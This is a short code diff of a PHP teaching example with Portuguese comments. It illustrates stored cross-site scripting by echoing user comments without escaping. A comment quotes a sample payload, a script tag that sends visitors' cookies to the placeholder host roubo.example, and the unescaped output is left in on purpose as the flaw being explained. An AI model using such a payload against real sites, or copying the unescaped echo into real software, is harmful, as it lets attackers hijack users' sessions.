@@ -43,7 +43,9 @@ $pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentari
 
 // PERIGOSO: reexibido depois, sem escape
 foreach ($comentarios as $c) {
-    echo $c['texto'];  // se um atacante postou <script>document.location='https://roubo.example/?c='+document.cookie</script>,
+    // se um atacante postou
+    // <script>document.location='https://roubo.example/?c='+document.cookie</script>,
+    echo $c['texto'];
                         // ESSE CODIGO EXECUTA em CADA visitante que ve esse comentario
 }
 
